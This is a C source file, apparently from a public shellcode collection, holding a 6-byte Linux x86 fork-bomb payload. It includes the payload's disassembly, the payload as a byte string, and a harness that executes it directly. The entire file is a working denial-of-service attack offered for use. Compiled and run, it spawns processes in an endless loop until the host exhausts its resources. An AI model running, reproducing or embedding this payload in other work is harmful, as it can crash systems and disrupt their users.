/*
Title:	Linux x86 forkbombe - 6 bytes
Author:	Jonathan Salwan <submit@shell-storm.org>
Web:	http://www.shell-storm.org

! Database of shellcodes: http://www.shell-storm.org/shellcode/


Disassembly of section .text:

08048054 <_a>:
 8048054:	b0 02                	mov    $0x2,%al
 8048056:	cd 80                	int    $0x80
 8048058:	eb fa                	jmp    8048054 <_a>

*/

#include <stdio.h>

char shellcode[] = "\xb0\x02\xcd\x80\xeb\xfa";

int main()
{
fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
(*(void  (*)()) shellcode)();
}